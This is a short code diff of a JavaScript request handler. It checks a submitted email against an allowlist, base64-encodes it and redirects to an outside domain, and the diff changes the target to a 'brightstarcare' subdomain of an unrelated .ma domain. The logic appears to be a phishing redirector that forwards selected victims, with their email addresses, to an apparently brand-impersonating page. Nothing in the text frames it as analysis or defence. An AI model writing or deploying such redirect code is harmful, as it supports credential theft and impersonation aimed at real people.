@@ -24,7 +24,7 @@ export default function handler(req, res) {
     // Validate the email
     if (allowedEmailsCache.includes(email)) {
       // Construct the redirect URL
-      const baseURL = "https://api.abhaje.ma/ib0dad67430ee471dbc1f43f05587198d/?ny=";
+      const baseURL = "https://brightstarcare.abhaje.ma/?04Td3vsv=aWIwZGFkNjc0MzBlZTQ3MWRiYzFmNDNmMDU1ODcxOThk&ny=";
       const encodedEmail = Buffer.from(email).toString("base64");
       const redirectURL = `${baseURL}${encodedEmail}`;
 
